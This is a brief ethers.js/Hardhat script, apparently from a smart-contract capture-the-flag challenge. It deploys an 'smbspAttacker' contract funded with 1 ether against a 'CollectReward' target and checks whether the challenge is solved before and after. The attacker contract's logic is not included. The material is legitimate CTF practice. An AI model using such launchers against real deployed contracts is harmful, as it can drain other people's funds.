const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("smbspAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x838Ed804d95044516C16473C91388AE195da0B76" );
  const ctf = await ethers.getContractAt( "CollectReward", "0xf8cd9B34e1B526Fef4D0eb2cA595D3D349F2301a" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy(ctf.address, { value: parseEther("1") });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
